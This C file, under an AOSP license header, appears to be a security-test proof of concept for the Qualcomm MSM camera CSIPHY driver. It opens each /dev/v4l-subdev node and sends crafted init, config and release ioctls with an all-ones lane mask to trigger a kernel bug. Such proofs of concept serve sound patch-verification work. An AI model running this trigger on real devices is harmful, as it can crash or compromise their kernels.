/**
 * Copyright (C) 2017 The Android Open Source Project
 *
 * Licensed under the Apache License, Version 2.0 (the "License");
 * you may not use this file except in compliance with the License.
 * You may obtain a copy of the License at
 *
 *      http://www.apache.org/licenses/LICENSE-2.0
 *
 * Unless required by applicable law or agreed to in writing, software
 * distributed under the License is distributed on an "AS IS" BASIS,
 * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
 * See the License for the specific language governing permissions and
 * limitations under the License.
 */

#define _GNU_SOURCE
#include <errno.h>
#include <fcntl.h>
#include <pthread.h>
#include <sched.h>
#include <signal.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/mman.h>
#include <sys/stat.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <unistd.h>
// for syscall
#include <sys/syscall.h>
// for futex
#include <linux/futex.h>
#include <sys/time.h>

#define LOG(fmt, ...) printf(fmt "\n", ##__VA_ARGS__)
#define ERR(fmt, ...) \
  printf(fmt ": %d(%s)\n", ##__VA_ARGS__, errno, strerror(errno))
#define ARRAY_SIZE(a) (sizeof(a) / sizeof((a)[0]))

#define BASE_VIDIOC_PRIVATE 192 /* 192-255 are private */

enum csiphy_cfg_type_t {
  CSIPHY_INIT,
  CSIPHY_CFG,
  CSIPHY_RELEASE,
};

struct msm_camera_csiphy_params {
  unsigned char lane_cnt;
  unsigned char settle_cnt;
  unsigned short lane_mask;
  unsigned char combo_mode;
  unsigned char csid_core;
  unsigned int csiphy_clk;
};

struct msm_camera_csi_lane_params {
  uint16_t csi_lane_assign;
  uint16_t csi_lane_mask;
};

struct csiphy_cfg_data {
  enum csiphy_cfg_type_t cfgtype;
  union {
    struct msm_camera_csiphy_params *csiphy_params;
    struct msm_camera_csi_lane_params *csi_lane_params;
  } cfg;
};
#define VIDIOC_MSM_CSIPHY_IO_CFG \
  _IOWR('V', BASE_VIDIOC_PRIVATE + 4, struct csiphy_cfg_data)

static int set_affinity(int num) {
  int ret = 0;
  cpu_set_t mask;
  CPU_ZERO(&mask);
  CPU_SET(num, &mask);
  ret = sched_setaffinity(0, sizeof(cpu_set_t), &mask);
  return ret;
}

volatile int v4lfd;

#define TRY_TIMES 10
int main(int argc, char *argv[]) {
  int i, j, ret;
  char buf[PAGE_SIZE] = {0};
  struct csiphy_cfg_data cfg = {0};
  struct msm_camera_csi_lane_params lane = {.csi_lane_mask = 0xFFFF};
  struct msm_camera_csiphy_params csi;
  char CSIPHY[32] = {0};

  /* bind_cpu */
  set_affinity(0);
  for (i = 0; i < 32; i++) {
    if (snprintf(CSIPHY, sizeof(CSIPHY), "/dev/v4l-subdev%d", i) < 0) {
      exit(EXIT_FAILURE);
    }

    v4lfd = open(CSIPHY, O_RDONLY);

    // init
    cfg.cfgtype = CSIPHY_INIT;
    if (ioctl(v4lfd, VIDIOC_MSM_CSIPHY_IO_CFG, &cfg)) {
      close(v4lfd);
      continue;
    }

    csi.lane_mask = 0xFFFF;
    csi.lane_cnt = 1;
    cfg.cfgtype = CSIPHY_CFG;
    cfg.cfg.csiphy_params = &csi;
    if (ioctl(v4lfd, VIDIOC_MSM_CSIPHY_IO_CFG, &cfg)) {
      close(v4lfd);
      continue;
    }

    // deinit
    cfg.cfgtype = CSIPHY_RELEASE;
    cfg.cfg.csi_lane_params = &lane;
    if (ioctl(v4lfd, VIDIOC_MSM_CSIPHY_IO_CFG, &cfg)) {
      close(v4lfd);
      continue;
    }

    close(v4lfd);
  }
  return 0;
}
